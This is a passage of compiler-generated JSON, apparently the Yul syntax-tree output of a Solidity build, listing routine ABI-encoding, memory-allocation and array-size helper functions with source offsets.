"abi_encode_tuple_t_stringliteral_12a8e5623d251e191fe4a291d9a59bcc01a4db7a1f5c20fc8de44358c18308af__to_t_string_memory_ptr__fromStack_reversed","nodeType":"YulFunctionDefinition","parameters":[{"name":"headStart","nodeType":"YulTypedName","src":"12988:9:15","type":""}],"returnVariables":[{"name":"tail","nodeType":"YulTypedName","src":"13003:4:15","type":""}],"src":"12837:419:15"},{"body":{"nodeType":"YulBlock","src":"13433:248:15","statements":[{"nodeType":"YulAssignment","src":"13443:26:15","value":{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"13455:9:15"},{"kind":"number","nodeType":"YulLiteral","src":"13466:2:15","type":"","value":"32"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"13451:3:15"},"nodeType":"YulFunctionCall","src":"13451:18:15"},"variableNames":[{"name":"tail","nodeType":"YulIdentifier","src":"13443:4:15"}]},{"expression":{"arguments":[{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"13490:9:15"},{"kind":"number","nodeType":"YulLiteral","src":"13501:1:15","type":"","value":"0"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"13486:3:15"},"nodeType":"YulFunctionCall","src":"13486:17:15"},{"arguments":[{"name":"tail","nodeType":"YulIdentifier","src":"13509:4:15"},{"name":"headStart","nodeType":"YulIdentifier","src":"13515:9:15"}],"functionName":{"name":"sub","nodeType":"YulIdentifier","src":"13505:3:15"},"nodeType":"YulFunctionCall","src":"13505:20:15"}],"functionName":{"name":"mstore","nodeType":"YulIdentifier","src":"13479:6:15"},"nodeType":"YulFunctionCall","src":"13479:47:15"},"nodeType":"YulExpressionStatement","src":"13479:47:15"},{"nodeType":"YulAssignment","src":"13535:139:15","value":{"arguments":[{"name":"tail","nodeType":"YulIdentifier","src":"13669:4:15"}],"functionName":{"name":"abi_encode_t_stringliteral_1e766a06da43a53d0f4c380e06e5a342e14d5af1bf8501996c844905530ca84e_to_t_string_memory_ptr_fromStack","nodeType":"YulIdentifier","src":"13543:124:15"},"nodeType":"YulFunctionCall","src":"13543:131:15"},"variableNames":[{"name":"tail","nodeType":"YulIdentifier","src":"13535:4:15"}]}]},"name":"abi_encode_tuple_t_stringliteral_1e766a06da43a53d0f4c380e06e5a342e14d5af1bf8501996c844905530ca84e__to_t_string_memory_ptr__fromStack_reversed","nodeType":"YulFunctionDefinition","parameters":[{"name":"headStart","nodeType":"YulTypedName","src":"13413:9:15","type":""}],"returnVariables":[{"name":"tail","nodeType":"YulTypedName","src":"13428:4:15","type":""}],"src":"13262:419:15"},{"body":{"nodeType":"YulBlock","src":"13858:248:15","statements":[{"nodeType":"YulAssignment","src":"13868:26:15","value":{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"13880:9:15"},{"kind":"number","nodeType":"YulLiteral","src":"13891:2:15","type":"","value":"32"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"13876:3:15"},"nodeType":"YulFunctionCall","src":"13876:18:15"},"variableNames":[{"name":"tail","nodeType":"YulIdentifier","src":"13868:4:15"}]},{"expression":{"arguments":[{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"13915:9:15"},{"kind":"number","nodeType":"YulLiteral","src":"13926:1:15","type":"","value":"0"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"13911:3:15"},"nodeType":"YulFunctionCall","src":"13911:17:15"},{"arguments":[{"name":"tail","nodeType":"YulIdentifier","src":"13934:4:15"},{"name":"headStart","nodeType":"YulIdentifier","src":"13940:9:15"}],"functionName":{"name":"sub","nodeType":"YulIdentifier","src":"13930:3:15"},"nodeType":"YulFunctionCall","src":"13930:20:15"}],"functionName":{"name":"mstore","nodeType":"YulIdentifier","src":"13904:6:15"},"nodeType":"YulFunctionCall","src":"13904:47:15"},"nodeType":"YulExpressionStatement","src":"13904:47:15"},{"nodeType":"YulAssignment","src":"13960:139:15","value":{"arguments":[{"name":"tail","nodeType":"YulIdentifier","src":"14094:4:15"}],"functionName":{"name":"abi_encode_t_stringliteral_277f8ee9d5b4fc3c4149386f24de0fc1bbc63a8210e2197bfd1c0376a2ac5f48_to_t_string_memory_ptr_fromStack","nodeType":"YulIdentifier","src":"13968:124:15"},"nodeType":"YulFunctionCall","src":"13968:131:15"},"variableNames":[{"name":"tail","nodeType":"YulIdentifier","src":"13960:4:15"}]}]},"name":"abi_encode_tuple_t_stringliteral_277f8ee9d5b4fc3c4149386f24de0fc1bbc63a8210e2197bfd1c0376a2ac5f48__to_t_string_memory_ptr__fromStack_reversed","nodeType":"YulFunctionDefinition","parameters":[{"name":"headStart","nodeType":"YulTypedName","src":"13838:9:15","type":""}],"returnVariables":[{"name":"tail","nodeType":"YulTypedName","src":"13853:4:15","type":""}],"src":"13687:419:15"},{"body":{"nodeType":"YulBlock","src":"14283:248:15","statements":[{"nodeType":"YulAssignment","src":"14293:26:15","value":{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"14305:9:15"},{"kind":"number","nodeType":"YulLiteral","src":"14316:2:15","type":"","value":"32"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"14301:3:15"},"nodeType":"YulFunctionCall","src":"14301:18:15"},"variableNames":[{"name":"tail","nodeType":"YulIdentifier","src":"14293:4:15"}]},{"expression":{"arguments":[{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"14340:9:15"},{"kind":"number","nodeType":"YulLiteral","src":"14351:1:15","type":"","value":"0"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"14336:3:15"},"nodeType":"YulFunctionCall","src":"14336:17:15"},{"arguments":[{"name":"tail","nodeType":"YulIdentifier","src":"14359:4:15"},{"name":"headStart","nodeType":"YulIdentifier","src":"14365:9:15"}],"functionName":{"name":"sub","nodeType":"YulIdentifier","src":"14355:3:15"},"nodeType":"YulFunctionCall","src":"14355:20:15"}],"functionName":{"name":"mstore","nodeType":"YulIdentifier","src":"14329:6:15"},"nodeType":"YulFunctionCall","src":"14329:47:15"},"nodeType":"YulExpressionStatement","src":"14329:47:15"},{"nodeType":"YulAssignment","src":"14385:139:15","value":{"arguments":[{"name":"tail","nodeType":"YulIdentifier","src":"14519:4:15"}],"functionName":{"name":"abi_encode_t_stringliteral_2a63ce106ef95058ed21fd07c42a10f11dc5c32ac13a4e847923f7759f635d57_to_t_string_memory_ptr_fromStack","nodeType":"YulIdentifier","src":"14393:124:15"},"nodeType":"YulFunctionCall","src":"14393:131:15"},"variableNames":[{"name":"tail","nodeType":"YulIdentifier","src":"14385:4:15"}]}]},"name":"abi_encode_tuple_t_stringliteral_2a63ce106ef95058ed21fd07c42a10f11dc5c32ac13a4e847923f7759f635d57__to_t_string_memory_ptr__fromStack_reversed","nodeType":"YulFunctionDefinition","parameters":[{"name":"headStart","nodeType":"YulTypedName","src":"14263:9:15","type":""}],"returnVariables":[{"name":"tail","nodeType":"YulTypedName","src":"14278:4:15","type":""}],"src":"14112:419:15"},{"body":{"nodeType":"YulBlock","src":"14708:248:15","statements":[{"nodeType":"YulAssignment","src":"14718:26:15","value":{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"14730:9:15"},{"kind":"number","nodeType":"YulLiteral","src":"14741:2:15","type":"","value":"32"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"14726:3:15"},"nodeType":"YulFunctionCall","src":"14726:18:15"},"variableNames":[{"name":"tail","nodeType":"YulIdentifier","src":"14718:4:15"}]},{"expression":{"arguments":[{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"14765:9:15"},{"kind":"number","nodeType":"YulLiteral","src":"14776:1:15","type":"","value":"0"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"14761:3:15"},"nodeType":"YulFunctionCall","src":"14761:17:15"},{"arguments":[{"name":"tail","nodeType":"YulIdentifier","src":"14784:4:15"},{"name":"headStart","nodeType":"YulIdentifier","src":"14790:9:15"}],"functionName":{"name":"sub","nodeType":"YulIdentifier","src":"14780:3:15"},"nodeType":"YulFunctionCall","src":"14780:20:15"}],"functionName":{"name":"mstore","nodeType":"YulIdentifier","src":"14754:6:15"},"nodeType":"YulFunctionCall","src":"14754:47:15"},"nodeType":"YulExpressionStatement","src":"14754:47:15"},{"nodeType":"YulAssignment","src":"14810:139:15","value":{"arguments":[{"name":"tail","nodeType":"YulIdentifier","src":"14944:4:15"}],"functionName":{"name":"abi_encode_t_stringliteral_455fea98ea03c32d7dd1a6f1426917d80529bf47b3ccbde74e7206e889e709f4_to_t_string_memory_ptr_fromStack","nodeType":"YulIdentifier","src":"14818:124:15"},"nodeType":"YulFunctionCall","src":"14818:131:15"},"variableNames":[{"name":"tail","nodeType":"YulIdentifier","src":"14810:4:15"}]}]},"name":"abi_encode_tuple_t_stringliteral_455fea98ea03c32d7dd1a6f1426917d80529bf47b3ccbde74e7206e889e709f4__to_t_string_memory_ptr__fromStack_reversed","nodeType":"YulFunctionDefinition","parameters":[{"name":"headStart","nodeType":"YulTypedName","src":"14688:9:15","type":""}],"returnVariables":[{"name":"tail","nodeType":"YulTypedName","src":"14703:4:15","type":""}],"src":"14537:419:15"},{"body":{"nodeType":"YulBlock","src":"15133:248:15","statements":[{"nodeType":"YulAssignment","src":"15143:26:15","value":{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"15155:9:15"},{"kind":"number","nodeType":"YulLiteral","src":"15166:2:15","type":"","value":"32"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"15151:3:15"},"nodeType":"YulFunctionCall","src":"15151:18:15"},"variableNames":[{"name":"tail","nodeType":"YulIdentifier","src":"15143:4:15"}]},{"expression":{"arguments":[{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"15190:9:15"},{"kind":"number","nodeType":"YulLiteral","src":"15201:1:15","type":"","value":"0"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"15186:3:15"},"nodeType":"YulFunctionCall","src":"15186:17:15"},{"arguments":[{"name":"tail","nodeType":"YulIdentifier","src":"15209:4:15"},{"name":"headStart","nodeType":"YulIdentifier","src":"15215:9:15"}],"functionName":{"name":"sub","nodeType":"YulIdentifier","src":"15205:3:15"},"nodeType":"YulFunctionCall","src":"15205:20:15"}],"functionName":{"name":"mstore","nodeType":"YulIdentifier","src":"15179:6:15"},"nodeType":"YulFunctionCall","src":"15179:47:15"},"nodeType":"YulExpressionStatement","src":"15179:47:15"},{"nodeType":"YulAssignment","src":"15235:139:15","value":{"arguments":[{"name":"tail","nodeType":"YulIdentifier","src":"15369:4:15"}],"functionName":{"name":"abi_encode_t_stringliteral_45fe4329685be5ecd250fd0e6a25aea0ea4d0e30fb6a73c118b95749e6d70d05_to_t_string_memory_ptr_fromStack","nodeType":"YulIdentifier","src":"15243:124:15"},"nodeType":"YulFunctionCall","src":"15243:131:15"},"variableNames":[{"name":"tail","nodeType":"YulIdentifier","src":"15235:4:15"}]}]},"name":"abi_encode_tuple_t_stringliteral_45fe4329685be5ecd250fd0e6a25aea0ea4d0e30fb6a73c118b95749e6d70d05__to_t_string_memory_ptr__fromStack_reversed","nodeType":"YulFunctionDefinition","parameters":[{"name":"headStart","nodeType":"YulTypedName","src":"15113:9:15","type":""}],"returnVariables":[{"name":"tail","nodeType":"YulTypedName","src":"15128:4:15","type":""}],"src":"14962:419:15"},{"body":{"nodeType":"YulBlock","src":"15558:248:15","statements":[{"nodeType":"YulAssignment","src":"15568:26:15","value":{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"15580:9:15"},{"kind":"number","nodeType":"YulLiteral","src":"15591:2:15","type":"","value":"32"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"15576:3:15"},"nodeType":"YulFunctionCall","src":"15576:18:15"},"variableNames":[{"name":"tail","nodeType":"YulIdentifier","src":"15568:4:15"}]},{"expression":{"arguments":[{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"15615:9:15"},{"kind":"number","nodeType":"YulLiteral","src":"15626:1:15","type":"","value":"0"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"15611:3:15"},"nodeType":"YulFunctionCall","src":"15611:17:15"},{"arguments":[{"name":"tail","nodeType":"YulIdentifier","src":"15634:4:15"},{"name":"headStart","nodeType":"YulIdentifier","src":"15640:9:15"}],"functionName":{"name":"sub","nodeType":"YulIdentifier","src":"15630:3:15"},"nodeType":"YulFunctionCall","src":"15630:20:15"}],"functionName":{"name":"mstore","nodeType":"YulIdentifier","src":"15604:6:15"},"nodeType":"YulFunctionCall","src":"15604:47:15"},"nodeType":"YulExpressionStatement","src":"15604:47:15"},{"nodeType":"YulAssignment","src":"15660:139:15","value":{"arguments":[{"name":"tail","nodeType":"YulIdentifier","src":"15794:4:15"}],"functionName":{"name":"abi_encode_t_stringliteral_6d05c90094f31cfeb8f0eb86f0a513af3f7f8992991fbde41b08aa7960677159_to_t_string_memory_ptr_fromStack","nodeType":"YulIdentifier","src":"15668:124:15"},"nodeType":"YulFunctionCall","src":"15668:131:15"},"variableNames":[{"name":"tail","nodeType":"YulIdentifier","src":"15660:4:15"}]}]},"name":"abi_encode_tuple_t_stringliteral_6d05c90094f31cfeb8f0eb86f0a513af3f7f8992991fbde41b08aa7960677159__to_t_string_memory_ptr__fromStack_reversed","nodeType":"YulFunctionDefinition","parameters":[{"name":"headStart","nodeType":"YulTypedName","src":"15538:9:15","type":""}],"returnVariables":[{"name":"tail","nodeType":"YulTypedName","src":"15553:4:15","type":""}],"src":"15387:419:15"},{"body":{"nodeType":"YulBlock","src":"15983:248:15","statements":[{"nodeType":"YulAssignment","src":"15993:26:15","value":{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"16005:9:15"},{"kind":"number","nodeType":"YulLiteral","src":"16016:2:15","type":"","value":"32"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"16001:3:15"},"nodeType":"YulFunctionCall","src":"16001:18:15"},"variableNames":[{"name":"tail","nodeType":"YulIdentifier","src":"15993:4:15"}]},{"expression":{"arguments":[{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"16040:9:15"},{"kind":"number","nodeType":"YulLiteral","src":"16051:1:15","type":"","value":"0"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"16036:3:15"},"nodeType":"YulFunctionCall","src":"16036:17:15"},{"arguments":[{"name":"tail","nodeType":"YulIdentifier","src":"16059:4:15"},{"name":"headStart","nodeType":"YulIdentifier","src":"16065:9:15"}],"functionName":{"name":"sub","nodeType":"YulIdentifier","src":"16055:3:15"},"nodeType":"YulFunctionCall","src":"16055:20:15"}],"functionName":{"name":"mstore","nodeType":"YulIdentifier","src":"16029:6:15"},"nodeType":"YulFunctionCall","src":"16029:47:15"},"nodeType":"YulExpressionStatement","src":"16029:47:15"},{"nodeType":"YulAssignment","src":"16085:139:15","value":{"arguments":[{"name":"tail","nodeType":"YulIdentifier","src":"16219:4:15"}],"functionName":{"name":"abi_encode_t_stringliteral_8a66f4bb6512ffbfcc3db9b42318eb65f26ac15163eaa9a1e5cfa7bee9d1c7c6_to_t_string_memory_ptr_fromStack","nodeType":"YulIdentifier","src":"16093:124:15"},"nodeType":"YulFunctionCall","src":"16093:131:15"},"variableNames":[{"name":"tail","nodeType":"YulIdentifier","src":"16085:4:15"}]}]},"name":"abi_encode_tuple_t_stringliteral_8a66f4bb6512ffbfcc3db9b42318eb65f26ac15163eaa9a1e5cfa7bee9d1c7c6__to_t_string_memory_ptr__fromStack_reversed","nodeType":"YulFunctionDefinition","parameters":[{"name":"headStart","nodeType":"YulTypedName","src":"15963:9:15","type":""}],"returnVariables":[{"name":"tail","nodeType":"YulTypedName","src":"15978:4:15","type":""}],"src":"15812:419:15"},{"body":{"nodeType":"YulBlock","src":"16408:248:15","statements":[{"nodeType":"YulAssignment","src":"16418:26:15","value":{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"16430:9:15"},{"kind":"number","nodeType":"YulLiteral","src":"16441:2:15","type":"","value":"32"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"16426:3:15"},"nodeType":"YulFunctionCall","src":"16426:18:15"},"variableNames":[{"name":"tail","nodeType":"YulIdentifier","src":"16418:4:15"}]},{"expression":{"arguments":[{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"16465:9:15"},{"kind":"number","nodeType":"YulLiteral","src":"16476:1:15","type":"","value":"0"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"16461:3:15"},"nodeType":"YulFunctionCall","src":"16461:17:15"},{"arguments":[{"name":"tail","nodeType":"YulIdentifier","src":"16484:4:15"},{"name":"headStart","nodeType":"YulIdentifier","src":"16490:9:15"}],"functionName":{"name":"sub","nodeType":"YulIdentifier","src":"16480:3:15"},"nodeType":"YulFunctionCall","src":"16480:20:15"}],"functionName":{"name":"mstore","nodeType":"YulIdentifier","src":"16454:6:15"},"nodeType":"YulFunctionCall","src":"16454:47:15"},"nodeType":"YulExpressionStatement","src":"16454:47:15"},{"nodeType":"YulAssignment","src":"16510:139:15","value":{"arguments":[{"name":"tail","nodeType":"YulIdentifier","src":"16644:4:15"}],"functionName":{"name":"abi_encode_t_stringliteral_b08d2b0fec7cc108ab049809a8beb42779d969a49299d0c317c907d9db22974f_to_t_string_memory_ptr_fromStack","nodeType":"YulIdentifier","src":"16518:124:15"},"nodeType":"YulFunctionCall","src":"16518:131:15"},"variableNames":[{"name":"tail","nodeType":"YulIdentifier","src":"16510:4:15"}]}]},"name":"abi_encode_tuple_t_stringliteral_b08d2b0fec7cc108ab049809a8beb42779d969a49299d0c317c907d9db22974f__to_t_string_memory_ptr__fromStack_reversed","nodeType":"YulFunctionDefinition","parameters":[{"name":"headStart","nodeType":"YulTypedName","src":"16388:9:15","type":""}],"returnVariables":[{"name":"tail","nodeType":"YulTypedName","src":"16403:4:15","type":""}],"src":"16237:419:15"},{"body":{"nodeType":"YulBlock","src":"16833:248:15","statements":[{"nodeType":"YulAssignment","src":"16843:26:15","value":{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"16855:9:15"},{"kind":"number","nodeType":"YulLiteral","src":"16866:2:15","type":"","value":"32"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"16851:3:15"},"nodeType":"YulFunctionCall","src":"16851:18:15"},"variableNames":[{"name":"tail","nodeType":"YulIdentifier","src":"16843:4:15"}]},{"expression":{"arguments":[{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"16890:9:15"},{"kind":"number","nodeType":"YulLiteral","src":"16901:1:15","type":"","value":"0"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"16886:3:15"},"nodeType":"YulFunctionCall","src":"16886:17:15"},{"arguments":[{"name":"tail","nodeType":"YulIdentifier","src":"16909:4:15"},{"name":"headStart","nodeType":"YulIdentifier","src":"16915:9:15"}],"functionName":{"name":"sub","nodeType":"YulIdentifier","src":"16905:3:15"},"nodeType":"YulFunctionCall","src":"16905:20:15"}],"functionName":{"name":"mstore","nodeType":"YulIdentifier","src":"16879:6:15"},"nodeType":"YulFunctionCall","src":"16879:47:15"},"nodeType":"YulExpressionStatement","src":"16879:47:15"},{"nodeType":"YulAssignment","src":"16935:139:15","value":{"arguments":[{"name":"tail","nodeType":"YulIdentifier","src":"17069:4:15"}],"functionName":{"name":"abi_encode_t_stringliteral_b51b4875eede07862961e8f9365c6749f5fe55c6ee5d7a9e42b6912ad0b15942_to_t_string_memory_ptr_fromStack","nodeType":"YulIdentifier","src":"16943:124:15"},"nodeType":"YulFunctionCall","src":"16943:131:15"},"variableNames":[{"name":"tail","nodeType":"YulIdentifier","src":"16935:4:15"}]}]},"name":"abi_encode_tuple_t_stringliteral_b51b4875eede07862961e8f9365c6749f5fe55c6ee5d7a9e42b6912ad0b15942__to_t_string_memory_ptr__fromStack_reversed","nodeType":"YulFunctionDefinition","parameters":[{"name":"headStart","nodeType":"YulTypedName","src":"16813:9:15","type":""}],"returnVariables":[{"name":"tail","nodeType":"YulTypedName","src":"16828:4:15","type":""}],"src":"16662:419:15"},{"body":{"nodeType":"YulBlock","src":"17258:248:15","statements":[{"nodeType":"YulAssignment","src":"17268:26:15","value":{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"17280:9:15"},{"kind":"number","nodeType":"YulLiteral","src":"17291:2:15","type":"","value":"32"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"17276:3:15"},"nodeType":"YulFunctionCall","src":"17276:18:15"},"variableNames":[{"name":"tail","nodeType":"YulIdentifier","src":"17268:4:15"}]},{"expression":{"arguments":[{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"17315:9:15"},{"kind":"number","nodeType":"YulLiteral","src":"17326:1:15","type":"","value":"0"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"17311:3:15"},"nodeType":"YulFunctionCall","src":"17311:17:15"},{"arguments":[{"name":"tail","nodeType":"YulIdentifier","src":"17334:4:15"},{"name":"headStart","nodeType":"YulIdentifier","src":"17340:9:15"}],"functionName":{"name":"sub","nodeType":"YulIdentifier","src":"17330:3:15"},"nodeType":"YulFunctionCall","src":"17330:20:15"}],"functionName":{"name":"mstore","nodeType":"YulIdentifier","src":"17304:6:15"},"nodeType":"YulFunctionCall","src":"17304:47:15"},"nodeType":"YulExpressionStatement","src":"17304:47:15"},{"nodeType":"YulAssignment","src":"17360:139:15","value":{"arguments":[{"name":"tail","nodeType":"YulIdentifier","src":"17494:4:15"}],"functionName":{"name":"abi_encode_t_stringliteral_c6e14a63ffb144eeef7cce6988e5dce07c60a7e0a7b1ef25dbe18c61483e0a83_to_t_string_memory_ptr_fromStack","nodeType":"YulIdentifier","src":"17368:124:15"},"nodeType":"YulFunctionCall","src":"17368:131:15"},"variableNames":[{"name":"tail","nodeType":"YulIdentifier","src":"17360:4:15"}]}]},"name":"abi_encode_tuple_t_stringliteral_c6e14a63ffb144eeef7cce6988e5dce07c60a7e0a7b1ef25dbe18c61483e0a83__to_t_string_memory_ptr__fromStack_reversed","nodeType":"YulFunctionDefinition","parameters":[{"name":"headStart","nodeType":"YulTypedName","src":"17238:9:15","type":""}],"returnVariables":[{"name":"tail","nodeType":"YulTypedName","src":"17253:4:15","type":""}],"src":"17087:419:15"},{"body":{"nodeType":"YulBlock","src":"17683:248:15","statements":[{"nodeType":"YulAssignment","src":"17693:26:15","value":{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"17705:9:15"},{"kind":"number","nodeType":"YulLiteral","src":"17716:2:15","type":"","value":"32"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"17701:3:15"},"nodeType":"YulFunctionCall","src":"17701:18:15"},"variableNames":[{"name":"tail","nodeType":"YulIdentifier","src":"17693:4:15"}]},{"expression":{"arguments":[{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"17740:9:15"},{"kind":"number","nodeType":"YulLiteral","src":"17751:1:15","type":"","value":"0"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"17736:3:15"},"nodeType":"YulFunctionCall","src":"17736:17:15"},{"arguments":[{"name":"tail","nodeType":"YulIdentifier","src":"17759:4:15"},{"name":"headStart","nodeType":"YulIdentifier","src":"17765:9:15"}],"functionName":{"name":"sub","nodeType":"YulIdentifier","src":"17755:3:15"},"nodeType":"YulFunctionCall","src":"17755:20:15"}],"functionName":{"name":"mstore","nodeType":"YulIdentifier","src":"17729:6:15"},"nodeType":"YulFunctionCall","src":"17729:47:15"},"nodeType":"YulExpressionStatement","src":"17729:47:15"},{"nodeType":"YulAssignment","src":"17785:139:15","value":{"arguments":[{"name":"tail","nodeType":"YulIdentifier","src":"17919:4:15"}],"functionName":{"name":"abi_encode_t_stringliteral_f5aa35d101a465871fb3c22d23c1b63312a6f81b94df7ea2d24b8a5fcbdcb02a_to_t_string_memory_ptr_fromStack","nodeType":"YulIdentifier","src":"17793:124:15"},"nodeType":"YulFunctionCall","src":"17793:131:15"},"variableNames":[{"name":"tail","nodeType":"YulIdentifier","src":"17785:4:15"}]}]},"name":"abi_encode_tuple_t_stringliteral_f5aa35d101a465871fb3c22d23c1b63312a6f81b94df7ea2d24b8a5fcbdcb02a__to_t_string_memory_ptr__fromStack_reversed","nodeType":"YulFunctionDefinition","parameters":[{"name":"headStart","nodeType":"YulTypedName","src":"17663:9:15","type":""}],"returnVariables":[{"name":"tail","nodeType":"YulTypedName","src":"17678:4:15","type":""}],"src":"17512:419:15"},{"body":{"nodeType":"YulBlock","src":"18035:124:15","statements":[{"nodeType":"YulAssignment","src":"18045:26:15","value":{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"18057:9:15"},{"kind":"number","nodeType":"YulLiteral","src":"18068:2:15","type":"","value":"32"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"18053:3:15"},"nodeType":"YulFunctionCall","src":"18053:18:15"},"variableNames":[{"name":"tail","nodeType":"YulIdentifier","src":"18045:4:15"}]},{"expression":{"arguments":[{"name":"value0","nodeType":"YulIdentifier","src":"18125:6:15"},{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"18138:9:15"},{"kind":"number","nodeType":"YulLiteral","src":"18149:1:15","type":"","value":"0"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"18134:3:15"},"nodeType":"YulFunctionCall","src":"18134:17:15"}],"functionName":{"name":"abi_encode_t_uint256_to_t_uint256_fromStack","nodeType":"YulIdentifier","src":"18081:43:15"},"nodeType":"YulFunctionCall","src":"18081:71:15"},"nodeType":"YulExpressionStatement","src":"18081:71:15"}]},"name":"abi_encode_tuple_t_uint256__to_t_uint256__fromStack_reversed","nodeType":"YulFunctionDefinition","parameters":[{"name":"headStart","nodeType":"YulTypedName","src":"18007:9:15","type":""},{"name":"value0","nodeType":"YulTypedName","src":"18019:6:15","type":""}],"returnVariables":[{"name":"tail","nodeType":"YulTypedName","src":"18030:4:15","type":""}],"src":"17937:222:15"},{"body":{"nodeType":"YulBlock","src":"18206:88:15","statements":[{"nodeType":"YulAssignment","src":"18216:30:15","value":{"arguments":[],"functionName":{"name":"allocate_unbounded","nodeType":"YulIdentifier","src":"18226:18:15"},"nodeType":"YulFunctionCall","src":"18226:20:15"},"variableNames":[{"name":"memPtr","nodeType":"YulIdentifier","src":"18216:6:15"}]},{"expression":{"arguments":[{"name":"memPtr","nodeType":"YulIdentifier","src":"18275:6:15"},{"name":"size","nodeType":"YulIdentifier","src":"18283:4:15"}],"functionName":{"name":"finalize_allocation","nodeType":"YulIdentifier","src":"18255:19:15"},"nodeType":"YulFunctionCall","src":"18255:33:15"},"nodeType":"YulExpressionStatement","src":"18255:33:15"}]},"name":"allocate_memory","nodeType":"YulFunctionDefinition","parameters":[{"name":"size","nodeType":"YulTypedName","src":"18190:4:15","type":""}],"returnVariables":[{"name":"memPtr","nodeType":"YulTypedName","src":"18199:6:15","type":""}],"src":"18165:129:15"},{"body":{"nodeType":"YulBlock","src":"18340:35:15","statements":[{"nodeType":"YulAssignment","src":"18350:19:15","value":{"arguments":[{"kind":"number","nodeType":"YulLiteral","src":"18366:2:15","type":"","value":"64"}],"functionName":{"name":"mload","nodeType":"YulIdentifier","src":"18360:5:15"},"nodeType":"YulFunctionCall","src":"18360:9:15"},"variableNames":[{"name":"memPtr","nodeType":"YulIdentifier","src":"18350:6:15"}]}]},"name":"allocate_unbounded","nodeType":"YulFunctionDefinition","returnVariables":[{"name":"memPtr","nodeType":"YulTypedName","src":"18333:6:15","type":""}],"src":"18300:75:15"},{"body":{"nodeType":"YulBlock","src":"18447:241:15","statements":[{"body":{"nodeType":"YulBlock","src":"18552:22:15","statements":[{"expression":{"arguments":[],"functionName":{"name":"panic_error_0x41","nodeType":"YulIdentifier","src":"18554:16:15"},"nodeType":"YulFunctionCall","src":"18554:18:15"},"nodeType":"YulExpressionStatement","src":"18554:18:15"}]},"condition":{"arguments":[{"name":"length","nodeType":"YulIdentifier","src":"18524:6:15"},{"kind":"number","nodeType":"YulLiteral","src":"18532:18:15","type":"","value":"0xffffffffffffffff"}],"functionName":{"name":"gt","nodeType":"YulIdentifier","src":"18521:2:15"},"nodeType":"YulFunctionCall","src":"18521:30:15"},"nodeType":"YulIf","src":"18518:56:15"},{"nodeType":"YulAssignment","src":"18584:37:15","value":{"arguments":[{"name":"length","nodeType":"YulIdentifier","src":"18614:6:15"}],"functionName":{"name":"round_up_to_mul_of_32","nodeType":"YulIdentifier","src":"18592:21:15"},"nodeType":"YulFunctionCall","src":"18592:29:15"},"variableNames":[{"name":"size","nodeType":"YulIdentifier","src":"18584:4:15"}]},{"nodeType":"YulAssignment","src":"18658:23:15","value":{"arguments":[{"name":"size","nodeType":"YulIdentifier","src":"18670:4:15"},{"kind":"number","nodeType":"YulLiteral","src":"18676:4:15","type":"","value":"0x20"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"18666:3:15"},"nodeType":"YulFunctionCall","src":"18666:15:15"},"variableNames":[{"name":"size","nodeType":"YulIdentifier","src":"18658:4:15"}]}]},"name":"array_allocation_size_t_bytes_memory_ptr","nodeType":"YulFunctionDefinition","parameters":[{"name":"length","nodeType":"YulTypedName","src":"18431:6:15","type":""}],"returnVariables":[{"name":"size","nodeType":"YulTypedName","src":"18442:4:15","type":""}],"src":"18381:307:15"},{"body":{"nodeType":"YulBlock","src":"18752:40:15","statements":[{"nodeType":"YulAssignment","src":"18763:22:15","value":{"arguments":[{"name":"value","nodeType":"YulIdentifier","src":"18779:5:15"}],"functionName":{"name":"mload","nodeType":"YulIdentifier","src":"18773:5:15"},"nodeType":"YulFunctionCall","src":"18773:12:15"},"variableNames":[{"name":"length","nodeType":"YulIdentifier","src":"18763:6:15"}]}]},"name":"array_length_t_bytes_memory_ptr","nodeType":"YulFunctionDefinition","parameters":[{"name":"value","nodeType":"YulTypedName","src":"18735:5:15","type":""}],"returnVariables":[